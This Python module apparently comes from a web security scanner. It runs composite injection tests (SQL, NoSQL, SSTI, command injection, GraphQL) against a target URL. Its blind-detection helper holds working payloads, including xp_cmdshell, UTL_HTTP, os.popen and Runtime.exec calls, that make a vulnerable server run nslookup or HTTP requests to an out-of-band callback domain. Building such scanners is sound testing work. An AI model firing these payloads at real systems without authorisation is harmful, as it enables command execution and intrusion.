"""Composite injection test — SQL, NoSQL, SSTI, Command Injection, GraphQL."""

from __future__ import annotations

import json
import logging
import time
from typing import Any

from numasec.scanners._envelope import wrap_result

logger = logging.getLogger(__name__)


async def injection_test(
    url: str,
    types: str = "sql,nosql,ssti,cmdi",
    params: str = "",
    method: str = "GET",
    body: str = "",
    content_type: str = "form",
    headers: str = "",
    waf_evasion: bool = False,
    oob: bool = False,
) -> dict[str, Any]:
    """Test for injection vulnerabilities (SQL, NoSQL, SSTI, Command Injection, GraphQL).

    Args:
        url: Target URL to test.
        types: Comma-separated injection types: sql, nosql, ssti, cmdi, graphql.
        params: Comma-separated parameter names to test. Auto-detect if omitted.
        method: HTTP method (GET or POST).
        body: Request body (for POST). JSON string for APIs.
        content_type: Body encoding: form or json.
        headers: Optional JSON string of HTTP headers for authenticated testing.
        waf_evasion: Enable WAF bypass encoding for payloads.
        oob: Enable Out-of-Band detection for blind vulnerabilities via interactsh.
    """
    start = time.monotonic()
    type_set = {t.strip().lower() for t in types.split(",")}
    extra_headers: dict[str, str] = headers if isinstance(headers, dict) else (json.loads(headers) if headers else {})
    param_list: list[str] | None = [p.strip() for p in params.split(",") if p.strip()] or None
    body_dict: dict[str, str] | None = json.loads(body) if body else None
    results: dict[str, Any] = {
        "url": url,
        "types_tested": sorted(type_set),
        "vulnerabilities": [],
    }

    # OOB setup: register an interactsh session for blind detection
    oob_domain: str | None = None
    oob_session_cid: str | None = None
    if oob:
        try:
            from numasec.tools.oob_tool import python_oob_setup

            setup_raw = await python_oob_setup()
            setup_data = json.loads(setup_raw) if isinstance(setup_raw, str) else setup_raw
            if setup_data.get("status") == "registered":
                oob_domain = setup_data["domain"]
                oob_session_cid = setup_data["correlation_id"]
                logger.info("OOB session active: %s", oob_domain)
            else:
                logger.warning("OOB setup failed: %s", setup_data.get("error"))
        except Exception as exc:
            logger.warning("OOB setup error: %s", exc)

    if "sql" in type_set:
        try:
            from numasec.scanners.sqli_tester import PythonSQLiTester

            tester = PythonSQLiTester(extra_headers=extra_headers, waf_evasion=waf_evasion)
            sqli_result = await tester.test(
                url, params=param_list, method=method, body=body_dict, content_type=content_type
            )
            result_dict = sqli_result.to_dict()
            results["sql"] = result_dict
            results["vulnerabilities"].extend(result_dict.get("vulnerabilities", []))
        except Exception as exc:
            results["sql"] = {"error": str(exc)}

    if "nosql" in type_set:
        try:
            from numasec.scanners.nosql_tester import NoSqlTester

            nosql_tester = NoSqlTester(extra_headers=extra_headers)
            nosql_result = await nosql_tester.test(url, method=method)
            result_dict = nosql_result.to_dict()
            results["nosql"] = result_dict
            results["vulnerabilities"].extend(result_dict.get("vulnerabilities", []))
        except Exception as exc:
            results["nosql"] = {"error": str(exc)}

    if "ssti" in type_set:
        try:
            from numasec.scanners.ssti_tester import SstiTester

            ssti_tester = SstiTester(extra_headers=extra_headers, waf_evasion=waf_evasion)
            ssti_result = await ssti_tester.test(url, params=param_list, method=method, body=body_dict)
            result_dict = ssti_result.to_dict()
            results["ssti"] = result_dict
            results["vulnerabilities"].extend(result_dict.get("vulnerabilities", []))
        except Exception as exc:
            results["ssti"] = {"error": str(exc)}

    if "cmdi" in type_set:
        try:
            from numasec.scanners.command_injection_tester import CommandInjectionTester

            cmdi_tester = CommandInjectionTester()
            cmdi_result = await cmdi_tester.test(url, params=param_list, method=method, body=body_dict)
            result_dict = cmdi_result.to_dict()
            results["cmdi"] = result_dict
            results["vulnerabilities"].extend(result_dict.get("vulnerabilities", []))
        except Exception as exc:
            results["cmdi"] = {"error": str(exc)}

    if "graphql" in type_set:
        try:
            from numasec.scanners.graphql_tester import GraphQLTester

            gql_tester = GraphQLTester()
            gql_result = await gql_tester.test(url)
            result_dict = gql_result.to_dict()
            results["graphql"] = result_dict
            results["vulnerabilities"].extend(result_dict.get("vulnerabilities", []))
        except Exception as exc:
            results["graphql"] = {"error": str(exc)}

    # OOB blind injection: inject OOB payloads and poll for callbacks
    if oob_domain and oob_session_cid:
        try:
            blind_vulns = await _oob_blind_injection(
                url, oob_domain, type_set, method, extra_headers, param_list, body_dict
            )

            # Poll for callbacks after a short delay
            import asyncio
            await asyncio.sleep(3)

            from numasec.tools.oob_tool import python_oob_poll
            poll_raw = await python_oob_poll(correlation_id=oob_session_cid)
            poll_data = json.loads(poll_raw) if isinstance(poll_raw, str) else poll_raw

            interactions = poll_data.get("interactions", [])
            if interactions:
                results["oob"] = {
                    "blind_vulnerability_confirmed": True,
                    "interactions": interactions,
                }
                for interaction in interactions:
                    full_id = interaction.get("full_id", "")
                    vuln_type = _correlate_oob_interaction(full_id)
                    results["vulnerabilities"].append({
                        "type": f"blind_{vuln_type}",
                        "severity": "high",
                        "confidence": 0.95,
                        "evidence": (
                            f"OOB callback received: {interaction.get('protocol', 'unknown')} "
                            f"from {interaction.get('remote_address', 'unknown')} "
                            f"(blind {vuln_type} confirmed via DNS/HTTP callback)"
                        ),
                        "parameter": "",
                        "payload": f"OOB domain: {oob_domain}",
                    })
            else:
                results["oob"] = {"blind_vulnerability_confirmed": False}
        except Exception as exc:
            results["oob"] = {"error": str(exc)}

    total = len(results["vulnerabilities"])
    results["summary"] = (
        f"{total} injection {'vulnerability' if total == 1 else 'vulnerabilities'} found across {', '.join(sorted(type_set))}"
    )
    return wrap_result("injection_test", url, results, start_time=start)


# ---------------------------------------------------------------------------
# OOB blind injection helpers
# ---------------------------------------------------------------------------

# Suffix tags used to correlate OOB callbacks to specific vulnerability types
_OOB_SUFFIXES = {
    "sqli": "sqli",
    "cmdi": "cmdi",
    "ssti": "ssti",
    "xxe": "xxe",
    "ssrf": "ssrf",
}


def _correlate_oob_interaction(full_id: str) -> str:
    """Map an OOB interaction's full_id to a vulnerability type via suffix."""
    full_id_lower = full_id.lower()
    for suffix, vuln_type in _OOB_SUFFIXES.items():
        if suffix in full_id_lower:
            return vuln_type
    return "injection"


async def _oob_blind_injection(
    url: str,
    oob_domain: str,
    type_set: set[str],
    method: str,
    extra_headers: dict[str, str],
    param_list: list[str] | None,
    body_dict: dict[str, str] | None,
) -> None:
    """Inject OOB payloads for blind vulnerability detection.

    Sends payloads containing the OOB domain to trigger DNS/HTTP callbacks
    on the interactsh server. Each payload type uses a unique subdomain
    suffix so interactions can be correlated to the vulnerability class.
    """
    from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

    import httpx

    from numasec.core.http import create_client

    parsed = urlparse(url)
    test_params = param_list or list(parse_qs(parsed.query).keys()) or ["q", "search", "input"]

    # Build OOB payloads per vulnerability type
    oob_payloads: list[tuple[str, str]] = []

    if "sql" in type_set:
        oob_payloads.extend([
            ("sqli", f"' OR LOAD_FILE('\\\\\\\\sqli.{oob_domain}\\\\a')-- -"),
            ("sqli", f"'; EXEC xp_cmdshell 'nslookup sqli.{oob_domain}'-- -"),
            ("sqli", f"' || UTL_HTTP.REQUEST('http://sqli.{oob_domain}/')-- -"),
        ])

    if "cmdi" in type_set:
        oob_payloads.extend([
            ("cmdi", f"; nslookup cmdi.{oob_domain}"),
            ("cmdi", f"| nslookup cmdi.{oob_domain}"),
            ("cmdi", f"$(nslookup cmdi.{oob_domain})"),
        ])

    if "ssti" in type_set:
        oob_payloads.extend([
            ("ssti", f"{{{{config.__class__.__init__.__globals__['os'].popen('nslookup ssti.{oob_domain}').read()}}}}"),
            ("ssti", f'${{T(java.lang.Runtime).getRuntime().exec("nslookup ssti.{oob_domain}")}}'),
        ])

    if not oob_payloads:
        return

    async with create_client(timeout=10, headers=extra_headers or None) as client:
        for param in test_params[:3]:  # Limit to 3 params to avoid excessive requests
            for _suffix, payload in oob_payloads:
                try:
                    if method.upper() == "POST":
                        post_body = dict(body_dict) if body_dict else {}
                        post_body[param] = payload
                        await client.post(url, data=post_body)
                    else:
                        qs = parse_qs(parsed.query, keep_blank_values=True)
                        qs[param] = [payload]
                        new_query = urlencode(qs, doseq=True)
                        test_url = urlunparse(parsed._replace(query=new_query))
                        await client.get(test_url)
                except httpx.HTTPError:
                    pass
